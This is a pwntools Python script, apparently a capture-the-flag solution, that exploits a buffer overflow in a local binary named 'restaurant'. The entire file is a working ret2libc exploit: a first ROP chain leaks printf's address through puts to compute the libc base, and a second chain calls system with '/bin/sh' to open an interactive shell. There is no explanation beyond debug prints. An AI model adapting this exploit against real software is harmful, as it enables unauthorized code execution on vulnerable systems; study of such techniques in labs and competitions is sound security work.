from pwn import *


got = p64(0x601FA8)
elf  = context.binary = ELF('./restaurant')
libc = elf.libc
rop  = ROP('./restaurant')

p    = elf.process()


pop_rdi  = rop.find_gadget(['pop rdi', 'ret'])[0]
ret 	 = rop.find_gadget(['ret'])[0]
printf_got = elf.got.printf
puts_plt = 0x400650
fill     = elf.sym.fill

chain = [pop_rdi, printf_got, puts_plt, fill]
chain = b''.join(map(p64, chain))

print('pop_rdi = {}'.format(hex(pop_rdi)))
print('printf_got = {}'.format(hex(printf_got)))
print('puts_plt = {}'.format(hex(puts_plt)))
print('main = {}'.format(hex(fill)))

gdb.attach(p)

payload = asm('nop') * 40 + chain
p.sendlineafter(b'>', b'1') 
p.sendlineafter(b'>', payload)


output = p.recvline_startswith(b'Enjoy your').split(b'\xa3\x10\x40')[1].split(b'\n')[0]
printf_address = output + (8 - len(output)) * b'\x00'
libc_base = u64(printf_address) - libc.sym.printf

shell = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.sym.system

print('libc base: {}'.format(hex(libc_base)))
print('shell str: {}'.format(hex(shell)))
print('system: {}'.format(hex(system)))

chain = [pop_rdi, shell, ret, system]
chain = b''.join(map(p64, chain))

payload = b'A' * 40 + chain

p.send(payload)
p.interactive()

